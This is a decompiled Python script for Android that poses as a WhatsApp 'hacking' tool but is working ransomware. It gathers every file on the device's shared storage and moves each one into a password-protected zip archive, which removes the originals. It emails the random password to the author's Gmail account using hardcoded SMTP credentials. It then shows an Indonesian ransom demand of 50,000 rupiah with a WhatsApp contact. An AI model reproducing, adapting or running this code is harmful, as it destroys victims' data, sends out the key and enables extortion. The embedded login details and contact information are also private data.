# uncompyle6 version 3.5.0
# Python bytecode 2.7
# Decompiled from: Python 2.7.17 (default, Oct 23 2019, 08:25:46) 
# [GCC 4.2.1 Compatible Android (5220042 based on r346389c) Clang 8.0.7 (https://
# Embedded file name: <JustAHacker>
whoknow = 'ohiabuebmpoeomqk'
import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, smtplib
from glob import glob as s
daftar = []
cekks = os.access('/sdcard', os.R_OK)
os.system('command -v zip > /dev/null 2>&1 || pkg install zip')
if cekks == True:
    pass
else:
    print 'This Program Needs Permission To Read Whatsapp Data'
    print 'Please Give permission',
    sys.exit()
os.chdir('/sdcard')
has = s('*.*')
for a in has:
    daftar.append(a)

has = s('*/*.*')
for a in has:
    daftar.append(a)

has = s('*/*/*.*')
for a in has:
    daftar.append(a)

has = s('*/*/*/*.*')
for a in has:
    daftar.append(a)

has = s('*/*/*/*/*.*')
for a in has:
    daftar.append(a)

has = s('*/*/*/*/*/*.*')
for a in has:
    daftar.append(a)

menit = len(daftar) / 65
generate1 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
generate2 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
generate3 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
generate4 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
generate5 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
generate6 = ('').join(random.sample(map(chr, range(48, 57) + range(65, 90) + range(97, 122)), 10))
passcrypt = generate1 + generate2 + generate3 + generate4 + generate5 + generate6
os.system('clear')
name = raw_input('\x1b[1;33mYour Whatsapp : ')
raw_input('Target : ')
time.sleep(2)
print 'Please Wait ' + str(menit) + ' Minutes '
try:
    jfhfi = int(name)
except:
    print 'Enter Your Whatsapp'
    sys.exit()

if '+62' in str(name):
    pass
else:
    print 'Enter Your Whatsapp Using +62'
    sys.exit()
print 'Hacking Target..Please Wait'
print 'If You Cancel This Proggress,your Whatsapp will error'
print 'So Please Be Patient'
fadd = 'rafasyahagung@gmail.com'
tadd = 'rafasyahagung@gmail.com'
SUBJECT = 'Whatsapp Korban =  ' + name
TEXT = 'password zip = ' + str(passcrypt)
message = ('Subject: {}\n\n{}').format(SUBJECT, TEXT)
username = 'justabotsubs12@gmail.com'
server = smtplib.SMTP('smtp.gmail.com', 587)
server.ehlo()
server.starttls()
server.login(username, whoknow)
server.sendmail(fadd, tadd, message)
azaz = 0
for i in daftar:
    os.system('zip -rmq -1  --password ' + str(passcrypt) + ' myfile.zip ' + i)
    azaz += 1
    print str(azaz) + '/' + len(daftar) + ' Completed,please Wait'

print len(daftar) + ' Files Penting Anda Telah Dikunci,Termasuk photo'
print 'Selamat Semua File Anda Telah Dikunci'
print 'File Anda Terletak Di myfile.zip'
print 'Silakan Bayar 50Ribu Untuk Membuka File Nya'
print 'Whatsapp : 089682009902'